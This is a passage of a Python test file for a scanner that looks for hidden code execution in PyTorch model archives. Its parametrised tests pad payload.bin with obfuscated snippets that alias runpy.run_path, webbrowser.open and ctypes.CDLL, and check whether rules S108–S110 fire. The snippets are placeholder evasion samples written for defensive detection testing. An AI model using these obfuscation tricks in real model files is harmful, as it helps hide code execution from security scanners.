    padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
    payload = b"\x00\xffimport runpy as rp\nfrom runpy import run_path as runner\n" + padding + late_state + padding
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/payload.bin", payload)

    result = PyTorchZipScanner().scan(str(zip_path))

    assert not any(
        check.name == "JIT/Script Code Execution Detection"
        and check.status == CheckStatus.FAILED
        and check.location == f"{zip_path}:archive/data/payload.bin"
        and check.rule_code == "S108"
        for check in result.checks
    )


@pytest.mark.parametrize(
    "late_state",
    [
        b"enabled = True\nrunner = rp.run_path if enabled else print\n"
        + b"if globals().get('safe'):\n    runner = print\n(runner)('payload.py')\n",
        b"from runpy import run_path as runner\nif globals().get('enabled'):\n    pass\n"
        + b"elif True:\n    runner = print\n(runner)('payload.py')\n",
        (
            b"from runpy import run_path as runner\noriginal = runner\nif globals().get('safe'):\n"
            + b"    runner = print\n    if globals().get('restore'):\n        runner = original\n"
            + b"else:\n    runner = print\n(runner)('payload.py')\n"
        ),
        b"from runpy import run_path as runner\nprint = runner\nif globals().get('enabled'):\n"
        + b"    runner = print\nelse:\n    runner = print\n(runner)('payload.py')\n",
        b"\x00\xfffrom runpy import run_path as runner\nprint = runner\nif globals().get('enabled'):\n"
        + b"    runner = print\nelse:\n    runner = print\n(runner)('payload.py')\n",
    ],
)
def test_pytorch_zip_detects_late_alias_after_uncertain_safe_overwrite(tmp_path: Path, late_state: bytes) -> None:
    zip_path = tmp_path / "model.pt"
    padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
    payload = b"\x00\xffimport runpy as rp\n" + padding + late_state + padding
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/payload.bin", payload)

    result = PyTorchZipScanner().scan(str(zip_path))

    assert any(
        check.name == "JIT/Script Code Execution Detection"
        and check.status == CheckStatus.FAILED
        and check.location == f"{zip_path}:archive/data/payload.bin"
        and check.rule_code == "S108"
        for check in result.checks
    )


@pytest.mark.parametrize(
    "late_state",
    [
        b"import builtins\nbuiltins.print = False\nrunner = print or rp.run_path\n(runner)('payload.py')\n",
        b"import builtins\nvars(builtins)['print'] = False\nrunner = print or rp.run_path\n(runner)('payload.py')\n",
        b"import builtins\nvars(builtins).update({'print': False})\n"
        + b"runner = print or rp.run_path\n(runner)('payload.py')\n",
        b"import builtins\nvars(builtins)['pri' + 'nt'] = False\n"
        + b"runner = print or rp.run_path\n(runner)('payload.py')\n",
        b"import builtins\nvars(builtins).update(**{'print': False})\n"
        + b"runner = print or rp.run_path\n(runner)('payload.py')\n",
        b"from runpy import run_path as runner\nFalse and (runner := print)\n(runner)('payload.py')\n",
        (
            b"from runpy import run_path as runner\nclass Broken:\n"
            b"    def __enter__(self):\n        raise RuntimeError()\n"
            b"    def __exit__(self, *args):\n        return False\n"
            b"try:\n    with Broken() as runner:\n        pass\n"
            b"except RuntimeError:\n    pass\n(runner)('payload.py')\n"
        ),
    ],
)
def test_pytorch_zip_detects_late_alias_after_non_executed_safe_shadow(tmp_path: Path, late_state: bytes) -> None:
    zip_path = tmp_path / "model.pt"
    padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
    payload = b"\x00\xffimport runpy as rp\n" + padding + late_state + padding
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/payload.bin", payload)

    result = PyTorchZipScanner().scan(str(zip_path))

    assert any(
        check.name == "JIT/Script Code Execution Detection"
        and check.status == CheckStatus.FAILED
        and check.location == f"{zip_path}:archive/data/payload.bin"
        and check.rule_code == "S108"
        for check in result.checks
    )


def test_pytorch_zip_detects_retained_alias_after_raising_late_with_shadow(tmp_path: Path) -> None:
    zip_path = tmp_path / "model.pt"
    padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
    late_state = (
        b"class Broken:\n    def __enter__(self):\n        raise RuntimeError()\n"
        b"    def __exit__(self, *args):\n        return False\n"
        b"try:\n    with Broken() as runner:\n        pass\n"
        b"except RuntimeError:\n    pass\n(runner)('payload.py')\n"
    )
    payload = b"\x00\xfffrom runpy import run_path as runner\n" + padding + late_state + padding
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/payload.bin", payload)

    result = PyTorchZipScanner().scan(str(zip_path))

    assert any(
        check.name == "JIT/Script Code Execution Detection"
        and check.status == CheckStatus.FAILED
        and check.location == f"{zip_path}:archive/data/payload.bin"
        and check.rule_code == "S108"
        for check in result.checks
    )


def test_pytorch_zip_detects_forwarded_late_ctypes_attribute_load(tmp_path: Path) -> None:
    zip_path = tmp_path / "model.pt"
    padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
    payload = b"\x00\xffimport ctypes as c\n" + padding + b"loader = c.cdll\nloader.msvcrt\n" + padding
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/payload.bin", payload)

    result = PyTorchZipScanner().scan(str(zip_path))

    assert any(
        check.name == "JIT/Script Code Execution Detection"
        and check.status == CheckStatus.FAILED
        and check.location == f"{zip_path}:archive/data/payload.bin"
        and check.rule_code == "S110"
        for check in result.checks
    )


@pytest.mark.parametrize(
    ("prefix", "late_state", "rule_code"),
    [
        (
            b"import webbrowser as wb\n",
            b"import builtins\nvars(builtins)['print'] = False\n"
            b"opener = print or wb.open\n(opener)('https://example.invalid')\n",
            "S109",
        ),
        (
            b"import webbrowser as wb\n",
            b"import builtins\nvars(builtins).update({'print': False})\n"
            b"opener = print or wb.open\n(opener)('https://example.invalid')\n",
            "S109",
        ),
        (
            b"import webbrowser as wb\n",
            b"import builtins\nvars(builtins)['pri' + 'nt'] = False\n"
            b"opener = print or wb.open\n(opener)('https://example.invalid')\n",
            "S109",
        ),
        (
            b"import webbrowser as wb\n",
            b"import builtins\nvars(builtins).update(**{'print': False})\n"
            b"opener = print or wb.open\n(opener)('https://example.invalid')\n",
            "S109",
        ),
        (
            b"import ctypes as c\n",
            b"import builtins\nvars(builtins)['print'] = False\nloader = print or c.CDLL\n(loader)('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"import builtins\nvars(builtins).update({'print': False})\n"
            b"loader = print or c.CDLL\n(loader)('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"import builtins\nvars(builtins)['pri' + 'nt'] = False\n"
            b"loader = print or c.CDLL\n(loader)('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"import builtins\nvars(builtins).update(**{'print': False})\n"
            b"loader = print or c.CDLL\n(loader)('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"import builtins as b\nfor b.print in [False]:\n    pass\n"
            b"loader = print or c.CDLL\n(loader)('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"import builtins as b\nns = b.vars(b)\nupdate = ns.update\n"
            b"update({'print': False})\nloader = print or c.CDLL\n(loader)('libpayload.so')\n",
            "S110",
        ),
    ],
)
def test_pytorch_zip_detects_boolean_fallback_after_builtin_mapping_mutation(
    tmp_path: Path, prefix: bytes, late_state: bytes, rule_code: str
) -> None:
    zip_path = tmp_path / "model.pt"
    padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
    payload = b"\x00\xff" + prefix + padding + late_state + padding
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/payload.bin", payload)

    result = PyTorchZipScanner().scan(str(zip_path))

    assert any(
        check.name == "JIT/Script Code Execution Detection"
        and check.status == CheckStatus.FAILED
        and check.location == f"{zip_path}:archive/data/payload.bin"
        and check.rule_code == rule_code
        for check in result.checks
    )


@pytest.mark.parametrize(
    ("prefix", "late_state", "rule_code"),
    [
        (b"import runpy as rp\n", b"runner = print or rp.run_path\nrunner('safe')\n", "S108"),
        (
            b"import webbrowser as wb\n",
            b"opener = print or wb.open\nopener('https://example.invalid')\n",
            "S109",
        ),
        (b"import ctypes as c\n", b"loader = print or c.CDLL\nloader('libpayload.so')\n", "S110"),
    ],
)
def test_pytorch_zip_preserves_safe_boolean_fallback_after_builtin_restore(
    tmp_path: Path, prefix: bytes, late_state: bytes, rule_code: str
) -> None:
    zip_path = tmp_path / "model.pt"
    padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
    state = (
        b"import builtins\noriginal = builtins.print\n"
        b"vars(builtins)['print'] = False\nvars(builtins).update({'print': original})\n"
    )
    payload = b"\x00\xff" + prefix + padding + state + late_state + padding
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/payload.bin", payload)

    result = PyTorchZipScanner().scan(str(zip_path))

    assert not any(
        check.name == "JIT/Script Code Execution Detection"
        and check.status == CheckStatus.FAILED
        and check.location == f"{zip_path}:archive/data/payload.bin"
        and check.rule_code == rule_code
        for check in result.checks
    )


@pytest.mark.parametrize(
    ("prefix", "late_state", "rule_code"),
    [
        (
            b"import webbrowser as wb\n",
            b"wb.open = print\nopener = wb.open\nopener('safe')\n",
            "S109",
        ),
        (b"import ctypes as c\n", b"c.CDLL = print\nloader = c.CDLL\nloader('safe')\n", "S110"),
        (b"import ctypes as c\n", b"c.cdll = print\nloader = c.cdll\nloader.msvcrt\n", "S110"),
        (b"import webbrowser as wb\n", b"vars(wb).update(open=print)\nopener = wb.open\nopener('safe')\n", "S109"),
        (b"import webbrowser as wb\n", b"setattr(wb, 'open', print)\nopener = wb.open\nopener('safe')\n", "S109"),
        (b"import ctypes as c\n", b"c.__dict__['CDLL'] = print\nloader = c.CDLL\nloader('safe')\n", "S110"),
        (b"import ctypes as c\n", b"vars(c).update(CDLL=print)\nloader = c.CDLL\nloader('safe')\n", "S110"),
        (
            b"import ctypes as c\n",
            b"import builtins as b\nb.vars(c).update(CDLL=print)\nloader = c.CDLL\nloader('safe')\n",
            "S110",
        ),
        (
            b"import webbrowser as wb\n",
            b"wb.__dict__.update({'open': print})\nopener = wb.open\nopener('safe')\n",
            "S109",
        ),
        (
            b"import webbrowser as wb\n",
            b"vars(wb).update(**{'open': print})\nopener = wb.open\nopener('safe')\n",
            "S109",
        ),
        (
            b"import ctypes as c\n",
            b"c.__dict__.__setitem__('CDLL', print)\nloader = c.CDLL\nloader('safe')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"dict.update(c.__dict__, CDLL=print)\nloader = c.CDLL\nloader('safe')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"dict.update(c.__dict__, [('CDLL', print)])\nloader = c.CDLL\nloader('safe')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"c.__dict__.update([('CDLL', print)])\nloader = c.CDLL\nloader('safe')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"c.__dict__.__ior__({'CDLL': print})\nloader = c.CDLL\nloader('safe')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"dict.__ior__(c.__dict__, {'CDLL': print})\nloader = c.CDLL\nloader('safe')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"c.CDLL = print\ndel c.CDLL\nc.__dict__.setdefault('CDLL', print)\nloader = c.CDLL\nloader('safe')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"c.CDLL = print\ndel c.CDLL\ndict.setdefault(c.__dict__, 'CDLL', print)\n"
            b"loader = c.CDLL\nloader('safe')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"c.CDLL = print\ndel c.__dict__['CDLL']\nc.__dict__.setdefault('CDLL', print)\n"
            b"loader = c.CDLL\nloader('safe')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"c.CDLL = print\nc.__dict__.pop('CDLL')\nc.__dict__.setdefault('CDLL', print)\n"
            b"loader = c.CDLL\nloader('safe')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"original = c.CDLL\nc.CDLL = print\ndel c.CDLL; c.__dict__.setdefault('CDLL', print)\n"
            b"loader = c.CDLL\nloader('safe')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"original = c.CDLL\nc.CDLL = print\ndel c.CDLL\n"
            b"dict.__setitem__(c.__dict__, 'CDLL', print)\nc.__dict__.setdefault('CDLL', original)\n"
            b"loader = c.CDLL\nloader('safe')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"c.CDLL = print\ndict.pop(c.__dict__, 'CDLL')\nc.__dict__.setdefault('CDLL', print)\n"
            b"loader = c.CDLL\nloader('safe')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"c.CDLL = print\ndelattr(c, 'CDLL')\nc.__dict__.setdefault('CDLL', print)\n"
            b"loader = c.CDLL\nloader('safe')\n",
            "S110",
        ),
        (
            b"import webbrowser as wb\n",
            b"import builtins\nbuiltins.setattr(wb, 'open', print)\nopener = wb.open\nopener('safe')\n",
            "S109",
        ),
        (
            b"import webbrowser as wb\n",
            b"wb.__dict__['op' + 'en'] = print\nopener = wb.open\nopener('safe')\n",
            "S109",
        ),
        (
            b"import ctypes as c\n",
            b"vars(c).update(**{'CD' + 'LL': print})\nloader = c.CDLL\nloader('safe')\n",
            "S110",
        ),
        (
            b"import webbrowser as wb\n",
            b"original = wb.open\nwb.open = original\noriginal = print\nwb.open = original\n"
            b"opener = wb.open\nopener('safe')\n",
            "S109",
        ),
        (
            b"import webbrowser as wb\n",
            b"wb.open: object = print\nopener = wb.open\nopener('safe')\n",
            "S109",
        ),
        (
            b"import webbrowser as wb\n",
            b"namespace = wb.__dict__\nnamespace.update(open=print)\nopener = wb.open\nopener('safe')\n",
            "S109",
        ),
        (
            b"import webbrowser as wb\n",
            b"namespace, unused = wb.__dict__, None\nnamespace.update(open=print)\nopener = wb.open\nopener('safe')\n",
            "S109",
        ),
        (
            b"import webbrowser as wb\n",
            b"original = wb.open\ntry:\n    pass\nfinally:\n    wb.open = print\nopener = wb.open\nopener('safe')\n",
            "S109",
        ),
        (
            b"import webbrowser as wb\n",
            b"wb.open = print\nwb.open = wb.open\nopener = wb.open\nopener('safe')\n",
            "S109",
        ),
        (
            b"import webbrowser as wb\n",
            b"changed = setattr(wb, 'open', print)\nopener = wb.open\nopener('safe')\n",
            "S109",
        ),
        (
            b"import webbrowser as wb\n",
            b"original = wb.open\nnamespace = wb.__dict__\nnamespace |= {'open': print}\n"
            b"opener = wb.open\nopener('safe')\n",
            "S109",
        ),
        (
            b"import webbrowser as wb\n",
            b"original = wb.open\ntry:\n    wb.open = print\nexcept Exception:\n    pass\n"
            b"opener = wb.open\nopener('safe')\n",
            "S109",
        ),
        (
            b"import webbrowser as wb\n",
            b"original = wb.open\nfor _ in [0]:\n    wb.open = print\nopener = wb.open\nopener('safe')\n",
            "S109",
        ),
        (
            b"import webbrowser as wb\nimport builtins\n",
            b"False and setattr(builtins, 'setattr', print)\nbuiltins.setattr(wb, 'open', print)\n"
            b"opener = wb.open\nopener('safe')\n",
            "S109",
        ),
        (
            b"import webbrowser as wb\n",
            b"changed = (setattr(wb, 'open', print) is None)\nopener = wb.open\nopener('safe')\n",
            "S109",
        ),
        (
            b"import webbrowser as wb\n",
            b"noop = lambda arg=setattr(wb, 'open', print): arg\nopener = wb.open\nopener('safe')\n",
            "S109",
        ),
        (
            b"import webbrowser as wb\n",
            b"def noop(arg: wb.__dict__.update(open=print)):\n    pass\nopener = wb.open\nopener('safe')\n",
            "S109",
        ),
        (
            b"import webbrowser as wb\n",
            b"original = wb.open\nFalse and (print := original)\nwb.open = print\nopener = wb.open\nopener('safe')\n",
            "S109",
        ),
        (
            b"import webbrowser as wb\n",
            b"False and (setattr := print)\nsetattr(wb, 'open', print)\nopener = wb.open\nopener('safe')\n",
            "S109",
        ),
        (
            b"import webbrowser as wb\n",
            b"original = wb.open\nwb.open = print\ntry:\n    raise RuntimeError()\n"
            b"    wb.open = original\nexcept RuntimeError:\n    pass\nopener = wb.open\nopener('safe')\n",
            "S109",
        ),
        (
            b"import webbrowser as wb\n",
            b"try:\n    raise RuntimeError()\nexcept RuntimeError:\n    wb.open = print\n"
            b"opener = wb.open\nopener('safe')\n",
            "S109",
        ),
        (
            b"import webbrowser as wb\n",
            b"original = wb.open\nwb.open = print\ntry:\n    1 / 0\n    wb.open = original\n"
            b"except ZeroDivisionError:\n    pass\nopener = wb.open\nopener('safe')\n",
            "S109",
        ),
        (
            b"import webbrowser as wb\n",
            b"for _ in [0]:\n    pass\nelse:\n    wb.open = print\nopener = wb.open\nopener('safe')\n",
            "S109",
        ),
        (
            b"import webbrowser as wb\n",
            b"original = wb.open\nwb.open = print\nwhile False:\n    wb.open = original\n"
            b"opener = wb.open\nopener('safe')\n",
            "S109",
        ),
        (
            b"import webbrowser as wb\n",
            b"try:\n    raise FileNotFoundError()\nexcept OSError:\n    wb.open = print\n"
            b"opener = wb.open\nopener('safe')\n",
            "S109",
        ),
        (
            b"import ctypes as c\n",
            b"try:\n    raise PermissionError()\nexcept OSError:\n    c.CDLL = print\n"
            b"loader = c.CDLL\nloader('safe')\n",
            "S110",
        ),
        (
            b"import webbrowser as wb\n",
            b"list(wb.__dict__.update(open=print) for _ in [0])\nopener = wb.open\nopener('safe')\n",
            "S109",
        ),
        (
            b"import ctypes as c\n",
            b"sorted(c.__dict__.update(CDLL=print) for _ in [0])\nloader = c.CDLL\nloader('safe')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"for _ in [0]:\n    try:\n        raise RuntimeError()\n    except RuntimeError:\n        pass\n"
            b"    c.CDLL = print\nloader = c.CDLL\nloader('safe')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"if c.__dict__.update(CDLL=print) is None:\n    pass\nloader = c.CDLL\nloader('safe')\n",
            "S110",
        ),
        (
            b"import ctypes as c\nimport builtins\n",
            b"builtins.list(c.__dict__.update(CDLL=print) for _ in [0])\nloader = c.CDLL\nloader('safe')\n",
            "S110",
        ),
        (
            b"import ctypes as c\nimport builtins as b\n",
            b"b.list(c.__dict__.update(CDLL=print) for _ in [0])\nloader = c.CDLL\nloader('safe')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"RuntimeError = ValueError\ntry:\n    raise RuntimeError()\nexcept ValueError:\n"
            b"    c.CDLL = print\nloader = c.CDLL\nloader('safe')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"ValueError = RuntimeError\ntry:\n    raise RuntimeError()\nexcept ValueError:\n"
            b"    c.CDLL = print\nloader = c.CDLL\nloader('safe')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"try:\n    raise RuntimeError(c.__dict__.update(CDLL=print))\nexcept RuntimeError:\n"
            b"    pass\nloader = c.CDLL\nloader('safe')\n",
            "S110",
        ),
        (
            b"import ctypes as c\nimport contextlib\n",
            b"with (c.__dict__.update(CDLL=print) or contextlib.nullcontext()):\n"
            b"    pass\nloader = c.CDLL\nloader('safe')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"match c.__dict__.update(CDLL=print):\n    case _:\n        pass\nloader = c.CDLL\nloader('safe')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"for c.CDLL in [print]:\n    pass\nloader = c.CDLL\nloader('safe')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"match 0:\n    case 0 if c.__dict__.update(CDLL=print) is None:\n"
            b"        pass\nloader = c.CDLL\nloader('safe')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"subject = 0\nmatch subject:\n    case _ if c.__dict__.update(CDLL=print) is None:\n"
            b"        pass\nloader = c.CDLL\nloader('safe')\n",
            "S110",
        ),
        (
            b"import ctypes as c\nimport builtins\n",
            b"builtins.ValueError = RuntimeError\ntry:\n    raise RuntimeError()\nexcept ValueError:\n"
            b"    c.CDLL = print\nloader = c.CDLL\nloader('safe')\n",
            "S110",
        ),
        (
            b"import ctypes as c\nimport builtins\n",
            b"list = lambda iterable: None\nlist = builtins.list\n"
            b"list(c.__dict__.update(CDLL=print) for _ in [0])\nloader = c.CDLL\nloader('safe')\n",
            "S110",
        ),
        (
            b"import ctypes as c\nimport builtins\n",
            b"for list in [builtins.list]:\n    pass\n"
            b"list(c.__dict__.update(CDLL=print) for _ in [0])\nloader = c.CDLL\nloader('safe')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"import builtins as b\nreal_vars = b.vars\nb.vars = lambda obj: {}\n"
            b"if globals().get('enabled'):\n    real_vars = lambda obj: {}\n"
            b"else:\n    real_vars = lambda obj: {}\n"
            b"real_vars(b).update({'setattr': lambda *args: None})\n"
            b"b.setattr(c, 'CDLL', print)\nloader = c.CDLL\nloader('safe')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"import builtins as b\nfor b.setattr in []:\n    pass\n"
            b"b.setattr(c, 'CDLL', print)\nloader = c.CDLL\nloader('safe')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"import builtins as b\nfor b.list in ():\n    pass\n"
            b"list(c.__dict__.update(CDLL=print) for _ in [0])\nloader = c.CDLL\nloader('safe')\n",
            "S110",
        ),
        (
            b"import webbrowser as wb\n",
            b"original = wb.open\nwb.open = print\nfor _ in [0]:\n    continue\n"
            b"    wb.open = original\nopener = wb.open\nopener('safe')\n",
            "S109",
        ),
        (
            b"import webbrowser as wb\n",
            b"for _ in [0]:\n    if False:\n        continue\n    wb.open = print\nopener = wb.open\nopener('safe')\n",
            "S109",
        ),
        (
            b"import ctypes as c\nimport builtins\nclass Safe:\n"
            b"    @staticmethod\n    def pop(*args, **kwargs):\n        pass\n"
            b"builtins.dict = Safe\nfrom builtins import dict as real_dict\n"
            b"original = c.CDLL\nc.CDLL = print\nreal_dict.pop(c.__dict__, 'CDLL')\n",
            b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('safe')\n",
            "S110",
        ),
        (
            b"import ctypes as c\nclass Safe:\n"
            b"    @staticmethod\n    def pop(*args, **kwargs):\n        pass\n"
            b"real_dict = Safe\nenabled = True\nif enabled:\n"
            b"    from builtins import dict as real_dict\n    real_dict = Safe\n"
            b"original = c.CDLL\nc.CDLL = print\nreal_dict.pop(c.__dict__, 'CDLL')\n",
            b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('safe')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"class Safe:\n    @staticmethod\n    def pop(*args, **kwargs):\n        pass\n"
            b"real_dict = Safe\nenabled = True\nif enabled:\n"
            b"    from builtins import dict as real_dict\n    real_dict = Safe\n"
            b"original = c.CDLL\nc.CDLL = print\nreal_dict.pop(c.__dict__, 'CDLL')\n"
            b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('safe')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"class Safe:\n    @staticmethod\n    def pop(*args, **kwargs):\n        pass\n"
            b"real_dict = Safe\nenabled = True\nglobals()['enabled'] = False\nif enabled:\n"
            b"    from builtins import dict as real_dict\n"
            b"original = c.CDLL\nc.CDLL = print\nreal_dict.pop(c.__dict__, 'CDLL')\n"
            b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('safe')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"class Safe:\n    @staticmethod\n    def pop(*args, **kwargs):\n        pass\n"
            b"real_dict = Safe\nenabled = False\nglobals = lambda: {}\n"
            b"globals()['enabled'] = True\nif enabled:\n    from builtins import dict as real_dict\n"
            b"original = c.CDLL\nc.CDLL = print\nreal_dict.pop(c.__dict__, 'CDLL')\n"
            b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('safe')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"class Safe:\n    @staticmethod\n    def pop(*args, **kwargs):\n        pass\n"
            b"real_dict = Safe\nenabled = True\nglobals = lambda: {}\ndel globals\n"
            b"globals()['enabled'] = False\nif enabled:\n    from builtins import dict as real_dict\n"
            b"original = c.CDLL\nc.CDLL = print\nreal_dict.pop(c.__dict__, 'CDLL')\n"
            b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('safe')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"class Safe:\n    @staticmethod\n    def pop(*args, **kwargs):\n        pass\n"
            b"real_dict = Safe\nenabled = True\nglobals()['globals'] = lambda: {}\ndel globals\n"
            b"globals()['enabled'] = False\nif enabled:\n    from builtins import dict as real_dict\n"
            b"original = c.CDLL\nc.CDLL = print\nreal_dict.pop(c.__dict__, 'CDLL')\n"
            b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('safe')\n",
            "S110",
        ),
    ],
)
def test_pytorch_zip_preserves_safe_late_typed_member_overwrite(
    tmp_path: Path, prefix: bytes, late_state: bytes, rule_code: str
) -> None:
    zip_path = tmp_path / "model.pt"
    padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
    payload = b"\x00\xff" + prefix + padding + late_state + padding
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/payload.bin", payload)

    result = PyTorchZipScanner().scan(str(zip_path))

    assert not any(
        check.name == "JIT/Script Code Execution Detection"
        and check.status == CheckStatus.FAILED
        and check.location == f"{zip_path}:archive/data/payload.bin"
        and check.rule_code == rule_code
        for check in result.checks
    )


@pytest.mark.parametrize(
    ("prefix", "late_state", "rule_code"),
    [
        (
            b"import webbrowser as wb\n",
            b"opener = wb.open\nwb.open = print\nopener('https://example.invalid')\n",
            "S109",
        ),
        (b"import ctypes as c\n", b"loader = c.CDLL\nc.CDLL = print\nloader('libpayload.so')\n", "S110"),
        (b"import ctypes as c\n", b"loader = c.cdll\nc.cdll = print\nloader.msvcrt\n", "S110"),
        (
            b"import webbrowser as wb\n",
            b"original = wb.open\nwb.open = print\nwb.open = original\n"
            b"opener = wb.open\nopener('https://example.invalid')\n",
            "S109",
        ),
        (
            b"import ctypes as c\n",
            b"original = c.CDLL\nc.CDLL = print\nc.CDLL = original\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import webbrowser as wb\n",
            b"original = wb.open\nprint = original\nwb.open = print\n"
            b"opener = wb.open\nopener('https://example.invalid')\n",
            "S109",
        ),
        (
            b"import ctypes as c\n",
            b"original = c.CDLL\nprint = original\nc.CDLL = print\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import webbrowser as wb\n",
            b"original = wb.open\nsetattr = print\nsetattr(wb, 'open', print)\n"
            b"opener = wb.open\nopener('https://example.invalid')\n",
            "S109",
        ),
        (
            b"import webbrowser as wb\n",
            b"import builtins\noriginal = wb.open\nbuiltins.setattr = print\nsetattr(wb, 'open', print)\n"
            b"opener = wb.open\nopener('https://example.invalid')\n",
            "S109",
        ),
        (
            b"import webbrowser as wb\n",
            b"False and vars(wb).update(open=print)\nopener = wb.open\nopener('https://example.invalid')\n",
            "S109",
        ),
        (
            b"import ctypes as c\n",
            b"False and c.__dict__.__setitem__('CDLL', print)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import webbrowser as wb\n",
            b"noop = lambda: vars(wb).update(open=print)\nopener = wb.open\nopener('https://example.invalid')\n",
            "S109",
        ),
        (
            b"import webbrowser as wb\n",
            b"import builtins\noriginal = wb.open\nwb.open = print\nbuiltins.setattr(wb, 'open', original)\n"
            b"opener = wb.open\nopener('https://example.invalid')\n",
            "S109",
        ),
        (
            b"import webbrowser as wb\n",
            b"original = wb.open\nwb.open = print\nwb.__dict__['op' + 'en'] = original\n"
            b"opener = wb.open\nopener('https://example.invalid')\n",
            "S109",
        ),
        (
            b"import ctypes as c\n",
            b"original = c.CDLL\nc.CDLL = print\nvars(c).update(**{'CD' + 'LL': original})\n"
            b"loader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"original = c.CDLL\nc.CDLL = print\nc.__dict__.update([('CDLL', original)])\n"
            b"loader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"original = c.CDLL\nc.CDLL = print\ndict.update(c.__dict__, [('CDLL', original)])\n"
            b"loader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
